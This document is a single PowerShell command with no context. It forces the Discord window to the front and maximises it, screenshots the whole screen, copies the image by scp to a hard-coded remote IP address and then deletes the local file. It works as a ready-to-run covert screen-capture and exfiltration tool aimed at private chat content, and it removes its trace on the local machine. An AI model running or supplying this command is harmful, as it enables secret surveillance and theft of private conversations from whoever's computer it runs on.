powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms, System.Drawing; $p=Get-Process Discord -ErrorAction SilentlyContinue | Where-Object {$_.MainWindowHandle -ne 0}; if($p){$sig1='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; $sig2='[DllImport(\"user32.dll\")] public static extern bool SetForegroundWindow(IntPtr hWnd);'; Add-Type -MemberDefinition $sig1 -Name W1 -Namespace Win32; Add-Type -MemberDefinition $sig2 -Name W2 -Namespace Win32; [Win32.W1]::ShowWindowAsync($p.MainWindowHandle, 3) | Out-Null; [Win32.W2]::SetForegroundWindow($p.MainWindowHandle) | Out-Null} $ts = Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'; $file = \"$env:USERPROFILE\Pictures\screen_$ts.png\"; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height); $g = [System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); $bmp.Save($file); $g.Dispose(); $bmp.Dispose(); if (Test-Path $file) { scp $file ubuntu@193.123.189.154:/home/ubuntu/.ssh/screenshots/; if ($?) { Remove-Item $file } }"
